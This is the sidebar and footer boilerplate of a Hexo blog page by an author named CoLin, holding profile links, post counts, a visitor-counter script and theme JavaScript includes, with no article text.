      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">101</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">Symbols count total: </span>
    <span title="Symbols count total">889k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">13:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
